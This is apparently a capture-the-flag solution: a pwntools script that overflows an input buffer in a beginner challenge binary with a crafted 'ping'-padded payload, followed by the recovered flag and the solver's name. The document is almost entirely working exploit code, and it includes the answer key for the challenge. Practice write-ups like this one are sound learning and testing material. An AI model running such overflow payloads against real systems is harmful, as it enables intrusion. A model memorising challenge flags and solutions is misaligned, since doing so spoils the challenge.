# Solution
```
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b *0x401456
continue
'''.format(**locals())

exe = './main_no_flag'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()


payload = b'ping' * 15 + b'AAAA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x69\x6e\x67'
io.sendlineafter(b':',payload)

io.interactive()
```

Flag: `ping{b3g1nn3r_fr13nd1y_bu773r_0v3rfl0w}`

Solved by: yappare